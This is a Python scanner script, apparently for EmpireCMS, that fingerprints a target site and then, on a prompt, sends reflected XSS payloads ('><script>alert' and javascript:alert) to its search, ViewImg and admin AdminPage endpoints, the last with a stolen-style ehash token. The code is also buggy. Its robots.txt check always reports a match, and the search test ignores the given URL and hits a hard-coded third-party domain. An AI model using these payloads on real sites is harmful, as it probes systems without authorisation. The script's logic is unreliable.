import sys
from urllib import request
import requests

def robots(url):
    data = request.urlopen(url + "/robots.txt").read().decode('utf-8')
    if "EmpireCMS" or "/d" or "/e/class/" or "/e/config/" or "/e/data/" or "/e/enews/" or "/e/update/" in data:
        print ("[robots.txt] %s" % url)
    else:
        print("[robots.txt] No Found!")

def searchxss(url):
    x = "><script>alert(/xxxxdd/)</script>"
    data = requests.get("https://www.huorong.cn/search/keyword/index.php?allsame=3\" + x")
    data = str(data.text)
    if "xxxxdd" in data:
        print ("[search.php] %s" % url)
    else:
        print("[search.php] Exploit failed!")

def viewimgxss(url):
    data = request.urlopen(url + "/e/ViewImg/index.html?url=javascript:alert(/xxxxdd/)").read().decode('utf-8')
    if "xxxxdd" in data:
        print ("[viewimg] %s" % url)
    else:
        print("[view-img] Exploit failed!")

def ehashxss(url):

    xss = "&mainfile=javascript:alert(/xxxxdd/)"
    data = request.urlopen(url + "/e/admin/openpage/AdminPage.php?" + ehash + xss).read().decode('utf-8')
    if "xxxxdd" in data:
        print ("[ehash] %s" % url)
    else:
        print("[ehash] Exploit failed!")

def showinfo(url):
    css = "/e/data/images/qcss.css"
    data = request.urlopen(url + "/e/action/ShowInfo/").read().decode('utf-8')
    if css in data:
        print ("[ShowInfo] %s" % url)
    else:
        print("[ShowInfo] No Found!")
    data = request.urlopen(url + "/e/action/InfoType/").read().decode('utf-8')
    if css in data:
        print ("[InfoType] %s" % url)
    else:
        print("[InfoType] No Found!")

def info():
    text = '''
    $$$$$$$$\                         $$\                      $$$$$$\  $$\      $$\  $$$$$$\                                                   
$$  _____|                        \__|                    $$  __$$\ $$$\    $$$ |$$  __$$\                                                  
$$ |      $$$$$$\$$$$\   $$$$$$\  $$\  $$$$$$\   $$$$$$\  $$ /  \__|$$$$\  $$$$ |$$ /  \__| $$$$$$$\ $$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
$$$$$\    $$  _$$  _$$\ $$  __$$\ $$ |$$  __$$\ $$  __$$\ $$ |      $$\$$\$$ $$ |\$$$$$$\  $$  _____|\____$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
$$  __|   $$ / $$ / $$ |$$ /  $$ |$$ |$$ |  \__|$$$$$$$$ |$$ |      $$ \$$$  $$ | \____$$\ $$ /      $$$$$$$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
$$ |      $$ | $$ | $$ |$$ |  $$ |$$ |$$ |      $$   ____|$$ |  $$\ $$ |\$  /$$ |$$\   $$ |$$ |     $$  __$$ |$$ |  $$ |$$   ____|$$ |      
$$$$$$$$\ $$ | $$ | $$ |$$$$$$$  |$$ |$$ |      \$$$$$$$\ \$$$$$$  |$$ | \_/ $$ |\$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ |  $$ |\$$$$$$$\ $$ |      
\________|\__| \__| \__|$$  ____/ \__|\__|       \_______| \______/ \__|     \__| \______/  \_______|\_______|\__|  \__| \_______|\__|      
                        $$ |                                                                                                                
                        $$ |                                                                                                                
                        \__|                                                                                                                
    '''
    
    help = '''
    Usage: python3 EmpireCMScaner.py [-u] [--ehash]
    -u [url]
    Example: python3 EmpireCMScaner.py -u https://example.com
    --ehash [ehash]                     https://www.freebuf.com/vuls/176313.html
    Example: python3 EmpireCMScaner.py -u https://example.com --ehash ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK
    '''

    print(text)
    print(help)
    sys.exit()

if(len(sys.argv)==1):
    info()


if(sys.argv[1]=="-u"):
    url = sys.argv[2]
    robots(url)
    showinfo(url)
    choose = input("Are you going to try an xss attack?[y/n]:")
    if choose == "y":
        searchxss(url)
        viewimgxss(url)
    elif choose == "n":
        pass
    else:
        choose


if(len(sys.argv) == 5) and (sys.argv[3] == "--ehash"):
    ehash = sys.argv[4]
    ehashxss(url)
